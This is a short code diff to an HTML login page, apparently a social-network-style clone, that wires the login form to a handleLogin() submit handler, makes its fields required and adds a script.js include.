@@ -180,10 +180,10 @@
 
         <div class="login-container">
             <div class="login-form">
-                <form>
-                    <input type="text" class="input-field" placeholder="Email address or phone number">
-                    <input type="password" class="input-field" placeholder="Password">
-                    <button type="button" class="login-button">Log In</button>
+                <form onsubmit="return handleLogin()">
+                    <input type="text" class="input-field" placeholder="Email address or phone number" required>
+                    <input type="password" class="input-field" placeholder="Password" required>
+                    <button type="submit" class="login-button">Log In</button>
                     <a href="#" class="forgot-password">Forgotten password?</a>
                     <div class="divider"></div>
                     <button type="button" class="create-account">Create New Account</button>
@@ -195,4 +195,7 @@
         </div>
     </div>
 </body>
+
+<Script src="script.js"></Script>
+
 </html>
